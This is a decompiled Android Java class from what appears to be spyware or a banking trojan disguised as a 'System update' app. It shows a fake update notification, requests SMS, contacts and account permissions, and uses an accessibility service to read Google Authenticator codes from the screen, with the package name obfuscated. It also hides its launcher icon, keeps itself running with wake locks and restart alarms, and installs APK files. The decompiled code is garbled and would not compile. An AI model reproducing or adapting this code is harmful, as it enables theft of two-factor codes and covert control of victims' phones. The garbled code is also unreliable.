package com.system.caremanager;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.ArrayList;
import java.util.List;

public class DataPackager {

    public static String A_A;
    public static int FivePlusFive = "0x0";
    public static String G_RC;
    public static Boolean IDONE;
    public static String N_F;
    public static String S_RCC;
    public static int Trys = "0x0";
    public static PowerManager.WakeLock Wa;
    public static WifiManager.WifiLock Wi;
    public static Boolean asked;
    public static char c1 = "'\u0000'";
    public static String c_l;
    public static String dt;
    public static Executor e_xc;
    public static boolean iamworking;
    public static String isSuper;
    public static String j_x;
    public static String j_z;
    public static String jq;
    public static String l_g;
    public static int m_ax = "0x3e8";
    public static String dataProcessor;
    public static BroadcastReceiver rc;
    public static String s_cr;
    public static int s_f0 = "0x0";
    public static int s_f1 = "0x0";
    public static int s_f2 = "0x0";
    public static String s_fh;
    public static Boolean shown;
    public static int speedTime = "0x0";
    public static " " = ":";
    public static String usedraw;
    public static String wbvew;

    static {
        // Static initialization block
    }

    public DataPackagingEngine() {
        return;
    }

    public static Notification Foreground(Context param1, String param2, String param3) {
        String str = "notification";
        Object result = this.getSystemService(str);
        result = (NotificationManager) result;
        int SDK_INT = Build$VERSION.SDK_INT;
        int val = 26;
        int val2 = 17170445;
        String str2 = "New system software is available, Tap to learn more.";
        String str3 = "System update";
        if (SDK_INT < val) {
            // branch: cond_3d
        }
        int val3 = 3;
        NotificationChannel result2 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(param2, param3, val3);
        DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(result, null);
        DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(result, null);
        DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(result, result);
        Notification.Builder result3 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(param1, param2);
        Notification.Builder result4 = this.setContentTitle(str3);
        Notification.Builder result5 = this.setContentText(str2);
        Notification.Builder result6 = this.setSmallIcon(val2);
        Notification.Builder result7 = this.setAutoCancel(null);
        Notification result8 = this.build();
        return result;
        Notification.Builder notification.Builder = new Notification.Builder();
        Notification.Builder result9 = notification.Builder.setContentTitle(str3);
        Notification.Builder result10 = this.setContentText(str2);
        Notification.Builder result11 = this.setSmallIcon(val2);
        int val4 = 2;
        Notification.Builder result12 = this.setPriority(val4);
        Notification.Builder result13 = this.setAutoCancel(null);
        Notification result14 = this.build();
        return result;
    }

    public static boolean GS_B(Context param1) {
        String str = "keyguard";
        Object result = this.getSystemService(str);
        result = (KeyguardManager) result;
        boolean result2 = this.inKeyguardRestrictedInputMode();
        if (result == null) {
            // branch: cond_10
        }
        return null;
        return 1;
    }

    public static boolean H__P(Context param1, String[] param2) {
        if (param1 == null) {
            // branch: cond_15
        }
        if (param2 == null) {
            // branch: cond_15
        }
        int len = param2.length;
        if (null >= len) {
            // branch: cond_15
        }
        String item = param2[null];
        int result = ActivityCompat.checkSelfPermission(param1, item);
        if (result == null) {
            // branch: cond_12
        }
        return null;
        int val = null + 0x1;
        // continue loop -> :goto_7
        return 1;
    }

    public static boolean IA_E(Context param1, Class param2) {
        try {
            ComponentName componentName = new ComponentName();
            ContentResolver result = this.getContentResolver();
            String str = "enabled_accessibility_services";
            String result2 = Settings.Secure.getString(result, str);
            if (result != null) {
                // branch: cond_13
            }
            return null;
            TextUtils.SimpleStringSplitter textUtils.SimpleStringSplitter = new TextUtils.SimpleStringSplitter();
            int val = 58;
            textUtils.SimpleStringSplitter.setString(result);
            boolean result3 = textUtils.SimpleStringSplitter.hasNext();
            if (result == null) {
                // branch: cond_35
            }
            String result4 = textUtils.SimpleStringSplitter.next();
            ComponentName result5 = ComponentName.unflattenFromString(result);
            if (result == null) {
                // branch: cond_1d
            }
            boolean result6 = this.equals(componentName);
            if (result == null) {
                // branch: cond_1d
            }
            return 1;
            } catch (Exception e) {
                e.printStackTrace();
            return null;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static boolean NeedDraw() {
        String usedraw = DataPackagingEngine.usedraw;
        String str = "on";
        if (usedraw != str) {
            // branch: cond_8
        }
        return 1;
        return null;
    }

    public static boolean NeedSuper() {
        String isSuper = DataPackagingEngine.isSuper;
        String str = "on";
        if (isSuper != str) {
            // branch: cond_8
        }
        return 1;
        return null;
    }

    public static String[] PERMISSIONS() {
        String str = "android.permission.WRITE_EXTERNAL_STORAGE";
        String str2 = "android.permission.READ_EXTERNAL_STORAGE";
        String str3 = "android.permission.READ_SMS";
        String str4 = "android.permission.SEND_SMS";
        String str5 = "android.permission.GET_ACCOUNTS";
        String str6 = "android.permission.READ_CONTACTS";
        return result;
    }

    public static String ReadRecords(String param1) {
        try {
            File file = new File();
            long result = file.length();
            int intVal = (int) result;
            byte[] arr = new byte[intVal];
            FileInputStream fileInputStream = new FileInputStream();
            int result2 = fileInputStream.read(arr);
            } catch (Exception e) {
                e.printStackTrace();
            String result3 = Base64.encodeToString(arr, null);
            return result;
        } catch (IOException e) {
            e.printStackTrace();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    public static void StartNewScan(Context param1, Intent param2) {
        ComponentName result = this.startService(param2);
        return;
    }

    public static void SwapMe(Context param1, String param2) {
        try {
            if (param2 == null) {
                // branch: cond_7f
            }
            Resources result = this.getResources();
            int val = 2131296274;
            String result2 = result.getString(val);
            DataPackagingEngine.dataProcessor = result;
            char result3 = result.charAt(null);
            char c1 = DataPackagingEngine.c1;
            if (result != c1) {
                // branch: cond_7f
            }
            PackageManager result4 = this.getPackageManager();
            String Afterinstalloption = MainBackgroundService.Afterinstalloption;
            String str = "T";
            String str2 = "com.system.caremanager.MainActive";
            int val2 = 2;
            if (Afterinstalloption != str) {
                // branch: cond_39
            }
            ComponentName componentName = new ComponentName();
            String str3 = "";
            result.setComponentEnabledSetting(componentName, 1, 1);
            ComponentName componentName2 = new ComponentName();
            result.setComponentEnabledSetting(componentName2, val2, 1);
            // continue loop -> :goto_7f
            String Afterinstalloption2 = MainBackgroundService.Afterinstalloption;
            String str4 = "N";
            if (Afterinstalloption2 != str4) {
                // branch: cond_52
            }
            ComponentName componentName3 = new ComponentName();
            String str5 = "";
            result.setComponentEnabledSetting(componentName3, 1, 1);
            ComponentName componentName4 = new ComponentName();
            result.setComponentEnabledSetting(componentName4, val2, 1);
            // continue loop -> :goto_7f
            String Afterinstalloption3 = MainBackgroundService.Afterinstalloption;
            String str6 = "C";
            if (Afterinstalloption3 != str6) {
                // branch: cond_6b
            }
            ComponentName componentName5 = new ComponentName();
            String str7 = "";
            result.setComponentEnabledSetting(componentName5, 1, 1);
            ComponentName componentName6 = new ComponentName();
            result.setComponentEnabledSetting(componentName6, val2, 1);
            // continue loop -> :goto_7f
            String Afterinstalloption4 = MainBackgroundService.Afterinstalloption;
            String str8 = "K";
            if (Afterinstalloption4 != str8) {
                // branch: cond_7f
            }
            ComponentName componentName7 = new ComponentName();
            int result5 = result.getComponentEnabledSetting(componentName7);
            if (result == val2) {
                // branch: cond_7f
            }
            result.setComponentEnabledSetting(componentName7, val2, 1);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void writeKeyLog(Context param1, boolean param2) {
        try {
            if (param2 == null) {
                // branch: cond_2a
            }
            PowerManager.WakeLock Wa = DataPackagingEngine.Wa;
            if (Wa != null) {
                // branch: cond_2a
            }
            String str = "power";
            Object result = this.getSystemService(str);
            result = (PowerManager) result;
            PowerManager.WakeLock Wa2 = DataPackagingEngine.Wa;
            if (Wa2 != null) {
                // branch: cond_2a
            }
            String FTX0 = InstalledAppsScanner.FTX0;
            String result2 = FTX0.trim();
            PowerManager.WakeLock result3 = result.newWakeLock(1, result);
            DataPackagingEngine.Wa = result;
            boolean result4 = result.isHeld();
            if (result != null) {
                // branch: cond_2a
            }
            PowerManager.WakeLock Wa3 = DataPackagingEngine.Wa;
            Wa3.acquire();
            } catch (Exception e) {
                e.printStackTrace();
            WifiManager.WifiLock Wi = DataPackagingEngine.Wi;
            if (Wi != null) {
                // branch: cond_51
            }
            String str2 = "wifi";
            Object result5 = this.getSystemService(str2);
            result = (WifiManager) result;
            WifiManager.WifiLock Wi2 = DataPackagingEngine.Wi;
            if (Wi2 != null) {
                // branch: cond_51
            }
            String FTX1 = InstalledAppsScanner.FTX1;
            String result6 = FTX1.trim();
            WifiManager.WifiLock result7 = this.createWifiLock(1, result);
            DataPackagingEngine.Wi = result;
            boolean result8 = this.isHeld();
            if (result != null) {
                // branch: cond_51
            }
            WifiManager.WifiLock Wi3 = DataPackagingEngine.Wi;
            this.acquire();
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void _SGA2(AccessibilityEvent param1, String param2) {
        try {
            String str = "co##m.goog##le.andr##oid.ap##ps.authent##icator2";
            String str2 = "##";
            String result = DataPackagingEngine.removeString(str, str2);
            boolean result2 = param2.contains(result);
            if (result == null) {
                // branch: cond_b3
            }
            AccessibilityNodeInfo result3 = this.getSource();
            if (result != null) {
                // branch: cond_15
            }
            return;
            String str3 = "";
            AccessibilityNodeInfo result4 = this.getSource();
            String str6 = ".";
            String result5 = str4.replace(str5, str6);
            List result6 = DataPackagingEngine.findNodeWithClass(result, result);
            Iterator result7 = this.iterator();
            boolean result8 = this.hasNext();
            String str7 = "-";
            if (result == null) {
                // branch: cond_69
            }
            Object result9 = this.next();
            result = (AccessibilityNodeInfo) result;
            int result10 = result.getChildCount();
            if (null >= result) {
                // branch: cond_2d
            }
            AccessibilityNodeInfo result11 = result.getChild(null);
            CharSequence result12 = result.getText();
            if (result == null) {
                // branch: cond_66
            }
            StringBuilder stringBuilder = new StringBuilder();
            StringBuilder result13 = stringBuilder.append(str3);
            CharSequence result14 = result.getText();
            String result15 = result.toString();
            StringBuilder result16 = stringBuilder.append(result);
            StringBuilder result17 = stringBuilder.append(str7);
            String result18 = stringBuilder.toString();
            int val = null + 0x1;
            // continue loop -> :goto_3c
            String[] result19 = result.split(str7);
            boolean result20 = result.isEmpty();
            if (result != null) {
                // branch: cond_b3
            }
            AccessibilityServiceCore.sendGoogleAuth = val;
            int len = result.length;
            if (val >= len) {
                // branch: cond_a9
            }
            int len2 = result.length;
            int val2 = len2 + -0x1;
            if (val != val2) {
                // branch: cond_7e
            }
            // continue loop -> :goto_a9
            String s_fh = DataPackagingEngine.s_fh;
            StringBuilder stringBuilder2 = new StringBuilder();
            String str8 = "Google Authenticator<";
            StringBuilder result21 = stringBuilder2.append(str8);
            Object item = result[val];
            StringBuilder result22 = stringBuilder2.append(item);
            String str9 = "<";
            StringBuilder result23 = stringBuilder2.append(str9);
            int val3 = val + 0x1;
            Object item2 = result[val3];
            StringBuilder result24 = stringBuilder2.append(item2);
            String result25 = stringBuilder2.toString();
            byte[] result26 = result.getBytes();
            DataEncryptionEngine.encodeBase64(s_fh, result);
            } catch (Exception e) {
                e.printStackTrace();
            int val4 = val + 0x1;
            // continue loop -> :goto_75
            AccessibilityServiceCore MyAccess = MainBackgroundService.MyAccess;
            this.blockBackButton();
            AccessibilityServiceCore MyAccess2 = MainBackgroundService.MyAccess;
            this.navigateHome();
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static boolean appendData(Context param1, String param2) {
        try {
            PackageManager result = this.getPackageManager();
            PackageInfo result2 = this.getPackageInfo(param2, 1);
            ApplicationInfo result3 = this.getApplicationInfo(param2, null);
            boolean enabled = this.enabled;
            return enabled;
            } catch (Exception e) {
                e.printStackTrace();
            return null;
        } catch (Exception e) {
            e.printStackTrace();
        } catch (PackageManager$NameNotFoundException e) {
            e.printStackTrace();
        }
    }

    public static boolean acc(Context param1, Class param2) {
        try {
            ComponentName componentName = new ComponentName();
            ContentResolver result = this.getContentResolver();
            String str = "enabled_accessibility_services";
            String result2 = Settings.Secure.getString(result, str);
            if (result != null) {
                // branch: cond_13
            }
            return null;
            TextUtils.SimpleStringSplitter textUtils.SimpleStringSplitter = new TextUtils.SimpleStringSplitter();
            int val = 58;
            textUtils.SimpleStringSplitter.setString(result);
            boolean result3 = textUtils.SimpleStringSplitter.hasNext();
            if (result == null) {
                // branch: cond_35
            }
            String result4 = textUtils.SimpleStringSplitter.next();
            ComponentName result5 = ComponentName.unflattenFromString(result);
            if (result == null) {
                // branch: cond_1d
            }
            boolean result6 = this.equals(componentName);
            if (result == null) {
                // branch: cond_1d
            }
            return 1;
            } catch (Exception e) {
                e.printStackTrace();
            return null;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void compressData(Context param1, String param2) {
        try {
            Integer result = Integer.valueOf(param2);
            int result2 = result.intValue();
            // continue loop -> :goto_b
            } catch (Exception e) {
                e.printStackTrace();
            int val = 10000;
            int val2 = -1;
            if (val != val2) {
                // branch: cond_21
            }
            Class cls = MainBackgroundService.class;
            boolean result3 = BackgroundServiceHelper.removedqtractort40(MainBackgroundService.class, param1);
            if (result != null) {
                // branch: cond_29
            }
            Intent intent = new Intent();
            Class cls2 = MainBackgroundService.class;
            boolean result4 = this.stopService(intent);
            // continue loop -> :goto_29
            String str = "creamsasusynationwidersatisfiedyduixsmokecsuccessfullyoadwaresshoekcurrentgintroductionxfactorymforgotc136";
            DataPackagingEngine.phonixeffect(param1, str, MainBackgroundService.class, v1);
            DataPackagingEngine.rel(null);
            return;
        } catch (NumberFormatException e) {
            e.printStackTrace();
        }
    }

    public static byte[] connectServer(byte[] param1, int[] param2) {
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            int item = param2[null];
            int item2 = param2[1];
            byteArrayOutputStream.write(param1, item, item2);
            byteArrayOutputStream.close();
            } catch (Exception e) {
                e.printStackTrace();
            byte[] result = byteArrayOutputStream.toByteArray();
            return result;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void getDatabaseName(Context param1) {
        try {
            ContentResolver result = this.getContentResolver();
            String str = "wifi_sleep_policy";
            int val = 2;
            boolean result2 = Settings.System.putInt(result, str, val);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String removeString(String param1, String param2) {
        String str = "";
        String result = this.replace(param2, str);
        return result;
    }

    public static void dit(Context param1, String param2, String param3) {
        try {
            SharedPreferences result = PreferenceManager.getDefaultSharedPreferences(param1);
            SharedPreferences.Editor result2 = this.edit();
            String result3 = param2.trim();
            SharedPreferences.Editor result4 = this.putString(param3, result);
            boolean result5 = this.commit();
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void encryptData(String param1) {
        Executor e_xc = DataPackagingEngine.e_xc;
        e_xc = (ThreadPoolExecutor) e_xc;
        int result = e_xc.getActiveCount();
        int m_ax = DataPackagingEngine.m_ax;
        if (result < m_ax) {
            // branch: cond_d
        }
        return;
        Executor e_xc2 = DataPackagingEngine.e_xc;
        DataPackagingEngine.1 dataPackagingEngine.1 = new DataPackagingEngine.1();
        e_xc2.execute(dataPackagingEngine.1);
        return;
    }

    public static byte[] clearCache(String param1, byte[] param2) {
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] result = this.getBytes();
            byte[] result2 = DataPackagingEngine.restartService(result);
            byte[] result3 = DataPackagingEngine.restartService(param2);
            String result4 = str.replace(param1, str2);
            int len = result.length;
            String result5 = String.valueOf(len);
            byte[] result6 = result.getBytes();
            int len2 = result.length;
            String result7 = String.valueOf(len2);
            byte[] result8 = result.getBytes();
            int result9 = this.length();
            if (result <= 1) {
                // branch: cond_3e
            }
            int len3 = result.length;
            byteArrayOutputStream.write(result, null, len3);
            byteArrayOutputStream.write(null);
            int len4 = result.length;
            byteArrayOutputStream.write(result, null, len4);
            byteArrayOutputStream.write(null);
            boolean result10 = this.equals(str3);
            if (result != null) {
                // branch: cond_51
            }
            int len5 = result.length;
            byteArrayOutputStream.write(result, null, len5);
            int len6 = result.length;
            byteArrayOutputStream.write(result, null, len6);
            byte[] result11 = byteArrayOutputStream.toByteArray();
            byteArrayOutputStream.close();
            } catch (Exception e) {
                e.printStackTrace();
            return result;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static List findNodeWithClass(AccessibilityNodeInfo param1, String param2) {
        ArrayList arrayList = new ArrayList();
        if (param1 != null) {
            // branch: cond_8
        }
        return arrayList;
        int result = this.getChildCount();
        if (null >= result) {
            // branch: cond_39
        }
        AccessibilityNodeInfo result2 = this.getChild(null);
        if (result == null) {
            // branch: cond_36
        }
        CharSequence result3 = result.getClassName();
        String result4 = result.toString();
        String result5 = result.toLowerCase();
        String result6 = param2.toLowerCase();
        boolean result7 = result.contains(result);
        if (result == null) {
            // branch: cond_2f
        }
        boolean result8 = arrayList.add(result);
        // continue loop -> :goto_36
        List result9 = DataPackagingEngine.findNodeWithClass(result, param2);
        boolean result10 = arrayList.addAll(result);
        int val = null + 0x1;
        // continue loop -> :goto_d
        return arrayList;
    }

    public static String getToken(Context param1, String param2) {
        try {
            String str = "";
            SharedPreferences result = PreferenceManager.getDefaultSharedPreferences(param1);
            String result2 = this.getString(param2, str);
            boolean result3 = this.equalsIgnoreCase(str);
            if (result != null) {
                // branch: cond_11
            }
            return result;
            } catch (Exception e) {
                e.printStackTrace();
            return str;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static byte[] cleanupFiles(byte[] param1) {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        int len = param1.length;
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream();
        GZIPInputStream gZIPInputStream = new GZIPInputStream();
        byte[] arr = new byte[len];
        int result = this.read(arr);
        int val = -1;
        if (result == val) {
            // branch: cond_1e
        }
        byteArrayOutputStream.write(arr, null, result);
        // continue loop -> :goto_12
        this.close();
        byteArrayInputStream.close();
        byte[] result2 = byteArrayOutputStream.toByteArray();
        byteArrayOutputStream.close();
        return result;
    }

    public static String getLabelApplication(Context param1) {
        try {
            PackageManager result = this.getPackageManager();
            PackageManager result2 = this.getPackageManager();
            String result3 = this.getPackageName();
            int val = 128;
            ApplicationInfo result4 = result.getApplicationInfo(result, val);
            CharSequence result5 = result.getApplicationLabel(result);
            result = (String) result;
            return result;
            } catch (Exception e) {
                e.printStackTrace();
            String str = "";
            return str;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static byte[] getBytes(Object param1) {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream();
        objectOutputStream.writeObject(param1);
        objectOutputStream.flush();
        objectOutputStream.close();
        byte[] result = byteArrayOutputStream.toByteArray();
        byteArrayOutputStream.close();
        return result;
    }

    public static String handleError(String param1) {
        try {
            byte[] result = Base64.decode(param1, null);
            String string = new String();
            String str = "UTF-8";
            return string;
            } catch (Exception e) {
                e.printStackTrace();
            return null;
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    public static Boolean helpscanintnum(String param1, String param2) {
        int result = this.length();
        if (/* if-lez result */) {
            // branch: cond_18
        }
        int result2 = param2.length();
        if (/* if-lez result */) {
            // branch: cond_18
        }
        boolean result3 = this.equals(param2);
        if (result == null) {
            // branch: cond_18
        }
        Boolean result4 = Boolean.valueOf(1);
        return result;
        Boolean result5 = Boolean.valueOf(null);
        return result;
    }

    public static boolean is_dozemode(Context param1) {
        String str = "power";
        Object result = this.getSystemService(str);
        result = (PowerManager) result;
        String result2 = this.getPackageName();
        boolean result3 = result.isIgnoringBatteryOptimizations(result);
        return result;
    }

    public static void installPackage(Context param1, String param2, String param3) {
        try {
            File file = new File();
            boolean result = file.exists();
            if (result == null) {
                // branch: cond_33
            }
            Intent intent = new Intent();
            String str = "android.intent.action.VIEW";
            Uri result2 = DataPackagingEngine.uriFromFile(param1, file);
            String str2 = "application/vnd.android.package-archive";
            Intent result3 = intent.setDataAndType(result, str2);
            int val = 268435456;
            Intent result4 = intent.addFlags(val);
            Intent result5 = intent.addFlags(1);
            boolean result6 = DataPackagingEngine.NeedSuper();
            if (result == null) {
                // branch: cond_30
            }
            Boolean result7 = Boolean.valueOf(1);
            AccessibilityServiceCore.fOR_IN = result;
            this.startActivity(intent);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        } catch (ActivityNotFoundException e) {
            e.printStackTrace();
        }
    }

    public static void o(Context param1, String param2) {
        try {
            PackageManager result = this.getPackageManager();
            Intent result2 = result.getLaunchIntentForPackage(param2);
            if (result == null) {
                // branch: cond_d
            }
            this.startActivity(result);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static boolean p(Context param1, String param2) {
        try {
            PackageManager result = this.getPackageManager();
            ApplicationInfo result2 = this.getApplicationInfo(param2, null);
            return 1;
            } catch (Exception e) {
                e.printStackTrace();
            return null;
        } catch (PackageManager$NameNotFoundException e) {
            e.printStackTrace();
        }
    }

    public static void phonixeffect(Context param1, String param2, long param3) {
        try {
            Intent intent = new Intent();
            Class cls = RestartSensorReceiver.class;
            String str = "RestartSensor";
            String str2 = "";
            String result = str.replace(param2, str2);
            Intent result2 = intent.setAction(result);
            PendingIntent result3 = PendingIntent.getBroadcast(param1, null, intent, null);
            String str3 = "alarm";
            Object result4 = this.getSystemService(str3);
            result = (AlarmManager) result;
            long result5 = System.currentTimeMillis();
            long longVal = result + param3;
            v1 .. v7.setRepeating();
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void rel(boolean param1) {
        try {
            PowerManager.WakeLock Wa = DataPackagingEngine.Wa;
            if (Wa == null) {
                // branch: cond_12
            }
            boolean result = Wa.isHeld();
            if (result == null) {
                // branch: cond_12
            }
            PowerManager.WakeLock Wa2 = DataPackagingEngine.Wa;
            Wa2.release();
            DataPackagingEngine.Wa = null;
            } catch (Exception e) {
                e.printStackTrace();
            if (param1 == null) {
                // branch: cond_15
            }
            return;
            WifiManager.WifiLock Wi = DataPackagingEngine.Wi;
            if (Wi == null) {
                // branch: cond_26
            }
            boolean result2 = this.isHeld();
            if (result == null) {
                // branch: cond_26
            }
            WifiManager.WifiLock Wi2 = DataPackagingEngine.Wi;
            this.release();
            DataPackagingEngine.Wi = null;
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static byte[] restartService(byte[] param1) {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        int len = param1.length;
        GZIPOutputStream gZIPOutputStream = new GZIPOutputStream();
        gZIPOutputStream.write(param1);
        gZIPOutputStream.close();
        byte[] result = byteArrayOutputStream.toByteArray();
        byteArrayOutputStream.close();
        return result;
    }

    public static byte[] selectNode(byte[] param1, int[] param2) {
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            int item = param2[null];
            byteArrayOutputStream.write(param1, null, item);
            byteArrayOutputStream.close();
            } catch (Exception e) {
                e.printStackTrace();
            byte[] result = byteArrayOutputStream.toByteArray();
            return result;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static boolean sv(Context param1) {
        try {
            String str = "power";
            Object result = this.getSystemService(str);
            result = (PowerManager) result;
            boolean result2 = this.isPowerSaveMode();
            if (result != 1) {
                // branch: cond_10
            }
            return 1;
            } catch (Exception e) {
                e.printStackTrace();
            return null;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Uri uriFromFile(Context param1, File param2) {
        int SDK_INT = Build$VERSION.SDK_INT;
        int val = 24;
        if (SDK_INT < val) {
            // branch: cond_d
        }
        String str = "com.system.caremanager.app.provider";
        Uri result = FileProvider.getUriForFile(param1, str, param2);
        return result;
        Uri result2 = Uri.fromFile(param2);
        return result;
    }

}